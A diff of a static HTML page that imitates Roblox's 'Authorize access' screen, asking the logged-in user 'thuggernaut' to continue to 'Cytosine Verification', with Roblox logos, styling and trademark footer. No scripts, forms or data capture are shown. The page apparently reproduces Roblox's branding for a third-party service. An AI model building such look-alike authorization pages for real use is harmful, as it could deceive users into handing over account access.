@@ -1,76 +1,119 @@
 <!DOCTYPE html>
-<html lang="en" class="dark">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width" />
-    <title>Authorize access - Roblox</title>
-    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-    <style>
-      body {
-        background-color: #0d0d0d;
-        color: white;
-        font-family: 'Segoe UI', sans-serif;
-      }
-    </style>
-  </head>
-  <body>
-    <!-- Header -->
-    <header class="w-full bg-[#1a1a1a] p-4">
-      <img src="/assets/logo/global_logo_white.svg" alt="Roblox Logo" class="h-8" />
-    </header>
+<html lang="en" style="background-color: rgb(17, 18, 22); color: white;">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authorize access - Roblox</title>
+  <link rel="icon" type="image/x-icon" href="/assets/favicon.ico">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mui/material@5.15.15/dist/material.min.css">
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background-color: rgb(17, 18, 22);
+      color: white;
+    }
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+      text-align: center;
+    }
+    .footer {
+      font-size: 12px;
+      color: rgba(255, 255, 255, 0.5);
+      padding: 1rem;
+      text-align: center;
+    }
+    .footer a {
+      color: rgba(255, 255, 255, 0.5);
+      text-decoration: none;
+      margin: 0 5px;
+    }
+    .footer a:hover {
+      text-decoration: underline;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 1.5rem 0;
+      color: rgba(255, 255, 255, 0.6);
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: rgba(255, 255, 255, 0.2);
+    }
+    .divider:not(:empty)::before {
+      margin-right: .75em;
+    }
+    .divider:not(:empty)::after {
+      margin-left: .75em;
+    }
+    button {
+      margin-top: 1rem;
+      max-width: 320px;
+    }
+    .avatar {
+      margin: 1rem auto;
+      border-radius: 50%;
+      width: 100px;
+      height: 100px;
+    }
+    .footer-logo {
+      margin-bottom: 0.5rem;
+    }
+  </style>
+</head>
+<body>
+  <header style="padding: 1rem; display: flex; align-items: center; background-color: rgb(17, 18, 22);">
+    <img src="/assets/logo/global_logo_white.svg" width="195" height="35" alt="logo">
+  </header>
 
-    <!-- Main Container -->
-    <main class="max-w-lg mx-auto mt-20 px-4 text-center">
-      <h1 class="text-lg font-semibold mb-4">Select Account to Continue to Cytosine Verification</h1>
-      <p class="text-sm text-gray-300 mb-4">You’re logged in as</p>
+  <main>
+    <h1 style="font-size: 1.25rem; font-weight: 500; margin-bottom: 1rem;">
+      Select Account to Continue to Cytosine Verification
+    </h1>
+    <p style="opacity: 0.7;">You’re logged in as</p>
 
-      <!-- Avatar -->
-      <div class="flex flex-col items-center mb-2">
-        <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter"
-          alt="Avatar" class="rounded-full w-20 h-20 mb-2" />
-        <span class="text-white font-medium text-lg">thuggernaut</span>
-      </div>
+    <img class="avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-95958C2AF5E21A0C93AD09DA0C40A7B1-Png/150/150/AvatarHeadshot/Png/noFilter" alt="Avatar">
+    <div style="font-weight: 500; margin-bottom: 1rem;">thuggernaut</div>
 
-      <!-- Continue Button -->
-      <button
-        class="w-full mt-6 bg-[#00b06b] hover:bg-[#00a161] text-white py-2 rounded text-sm font-semibold transition duration-200">
-        Continue
-      </button>
+    <button class="MuiButtonBase-root MuiButton-root MuiButton-contained MuiButton-containedSecondary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth MuiButton-root MuiButton-contained MuiButton-containedSecondary MuiButton-sizeMedium MuiButton-containedSizeMedium MuiButton-fullWidth css-n1rgqe-Typography-buttonMedium-Button-contained-Typography-button-Typography-buttonMedium-Button-contained-operationButton" tabindex="0" type="button">
+      Continue
+      <span class="MuiTouchRipple-root css-w0pj6f"></span>
+    </button>
 
-      <!-- Divider -->
-      <div class="flex items-center my-4 text-gray-400 text-xs">
-        <div class="flex-grow border-t border-gray-600"></div>
-        <span class="mx-2">or</span>
-        <div class="flex-grow border-t border-gray-600"></div>
-      </div>
+    <div class="divider">or</div>
 
-      <!-- Change Account -->
-      <button
-        class="w-full border border-gray-600 hover:bg-gray-800 text-white py-2 rounded text-sm font-medium transition duration-200">
-        Change Account
-      </button>
-    </main>
+    <button class="MuiButtonBase-root MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-fullWidth MuiButton-root MuiButton-outlined MuiButton-outlinedSecondary MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-fullWidth css-9ipsbm-Typography-buttonMedium-Button-outlined-Typography-button-Typography-buttonMedium-Button-outlined-root" tabindex="0" type="button">
+      <span data-testid="loading-button-content">Change Account</span>
+      <span class="MuiTouchRipple-root css-w0pj6f"></span>
+    </button>
+  </main>
 
-    <!-- Footer -->
-    <footer class="mt-24 text-center text-gray-500 text-xs">
-      <div class="flex flex-wrap justify-center gap-2 mb-2">
-        <a href="https://corp.roblox.com/" class="hover:underline" target="_blank">About Us</a>
-        <span>|</span>
-        <a href="https://corp.roblox.com/careers/" class="hover:underline" target="_blank">Join Us</a>
-        <span>|</span>
-        <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" class="hover:underline"
-          target="_blank">Terms</a>
-        <span>|</span>
-        <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-"
-          class="hover:underline" target="_blank">Privacy</a>
-        <span>|</span>
-        <a href="https://www.roblox.com/info/accessibility" class="hover:underline" target="_blank">Accessibility</a>
-      </div>
-      <p class="mt-2">
-        ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and
-        unregistered trademarks in the U.S. and other countries.
-      </p>
-    </footer>
-  </body>
+  <footer class="footer">
+    <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-sm-12 MuiGrid-grid-md-auto css-1o1b8p-Grid-root-logo footer-logo">
+      <img src="/assets/logo/global_logo_white.svg" alt="logo" width="124" height="21.52">
+    </div>
+    <div>
+      <a href="https://corp.roblox.com/" target="_blank">About Us</a> |
+      <a href="https://corp.roblox.com/careers/" target="_blank">Join Us</a> |
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Terms</a> |
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-and-Cookie-Policy-" target="_blank">Privacy</a> |
+      <a href="https://www.roblox.com/info/accessibility" target="_blank">Accessibility</a>
+    </div>
+    <div style="margin-top: 0.5rem;">
+      ©2025 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+    </div>
+  </footer>
+</body>
 </html>
